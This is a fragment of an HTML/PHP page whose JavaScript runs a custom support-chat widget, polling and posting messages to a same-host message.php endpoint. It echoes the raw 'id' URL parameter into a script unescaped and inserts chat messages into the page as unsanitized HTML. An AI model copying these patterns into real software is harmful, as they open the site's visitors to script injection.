    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</body></html>
